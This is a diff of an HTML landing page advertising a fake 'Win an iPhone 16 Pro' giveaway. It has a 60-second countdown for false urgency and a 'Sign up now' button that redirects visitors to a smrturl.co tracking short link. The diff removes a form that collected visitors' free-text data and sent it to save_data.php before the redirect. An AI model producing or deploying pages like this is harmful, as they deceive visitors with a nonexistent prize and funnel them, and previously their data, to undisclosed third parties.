@@ -1,9 +1,9 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ro">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Win an iPhone 16 Pro</title>
+  <title>Win an iPhone 16 Pro</title>
     <link rel="stylesheet" href="styles.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap" rel="stylesheet">
 </head>
@@ -13,22 +13,16 @@
             <source src="background.mp4" type="video/mp4">
         </video>
         <div class="content">
-            <h1>Win an <span>iPhone 16 Pro</span>!</h1>
-            <p>Join now for a chance to own the latest iPhone.</p>
-            <div class="timer" id="timer">60</div>
+          <h1>Win an <span>iPhone 16 Pro</span>!</h1>
+           <p>Join now for a chance to own the latest iPhone.</p>
+           <div class="timer" id="timer">60</div>
             <div class="cta-container">
-                <!-- Formularul pentru colectarea datelor -->
-                <form action="save_data.php" method="GET" id="userForm">
-                    <label for="user_data">Introduceți datele:</label>
-                    <input type="text" id="user_data" name="user_data" required>
-                    <button type="submit" class="cta-button" id="cta-button">Sign up now</button>
-                </form>
+              <a href="#" class="cta-button" id="cta-button">Sign up now</a>
                 <img src="iphone.png" alt="iPhone 16 Pro" class="phone-image">
             </div>
         </div>
     </header>
 
-    <!-- Script pentru timer și redirecționare -->
     <script>
         let timeLeft = 60;
         const timerElement = document.getElementById("timer");
@@ -40,26 +34,20 @@
                 timerElement.textContent = timeLeft;
                 setTimeout(updateTimer, 1000);
             } else {
-                timerElement.textContent = "Time Expired!";
+               timerElement.textContent = "Time Expired!";
             }
         }
         updateTimer();
 
-        // Redirecționare la apăsarea butonului
         ctaButton.addEventListener("click", function(event) {
             event.preventDefault();
             ctaButton.style.transform = "scale(1.2)";
             ctaButton.style.transition = "transform 0.3s ease-in-out";
-
-            // Începem să trimitem datele înainte de redirecționare
-            const form = document.getElementById('userForm');
-            form.submit();  // Trimitere date către PHP pentru salvare
-
-            // După trimitere, redirecționăm utilizatorul
             setTimeout(() => {
                 window.location.href = "https://smrturl.co/a/s3f31d3c66e/1549?s1=";
-            }, 300); // Redirecționează la URL-ul dorit după 300 ms
+            }, 300);
         });
     </script>
 </body>
 </html>
+
